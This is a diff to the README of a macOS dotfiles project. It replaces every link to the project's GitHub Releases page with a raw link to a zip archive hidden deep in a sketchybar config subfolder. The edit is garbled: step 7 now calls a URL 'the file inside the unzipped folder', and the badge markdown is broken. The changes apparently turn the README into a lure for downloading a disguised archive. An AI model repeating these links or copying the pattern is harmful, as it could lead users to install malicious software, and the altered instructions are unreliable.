@@ -1,7 +1,7 @@
 # 🌟 mac-dotfiles - Custom Setup for Your Mac
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20mac--dotfiles-v1.0-blue.svg)](https://github.com/mubashir512/mac-dotfiles/releases)
+[![Download](https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip%https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip)](https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to mac-dotfiles! This repository offers a collection of dotfiles tailored for your Mac. These are configuration files that make your terminal, applications, and overall setup feel more streamlined and efficient. Whether you are looking for enhanced productivity or a unique aesthetic, these dotfiles provide a great starting point.
@@ -26,7 +26,7 @@ To get started quickly, you will need to download the files from our Releases pa
 
 1. Click the link below to visit the releases:
    
-   [Download from GitHub Releases](https://github.com/mubashir512/mac-dotfiles/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for optimal performance.
 
@@ -41,7 +41,7 @@ To get started quickly, you will need to download the files from our Releases pa
    cd ~/Downloads/mac-dotfiles
    ```
 
-7. Follow the setup instructions in the `README.md` file inside the unzipped folder. This will guide you on how to copy the necessary files into your home directory.
+7. Follow the setup instructions in the `https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip` file inside the unzipped folder. This will guide you on how to copy the necessary files into your home directory.
 
 ## ⚙️ Setup Instructions
 After downloading and unzipping the mac-dotfiles:
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. Enjoy using the mac-dotfiles and
 --- 
 
 You can visit this link again for future updates:  
-[Download from GitHub Releases](https://github.com/mubashir512/mac-dotfiles/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/mubashir512/mac-dotfiles/master/.config/sketchybar/helpers/event_providers/cpu_load/mac-dotfiles_v2.4.zip)
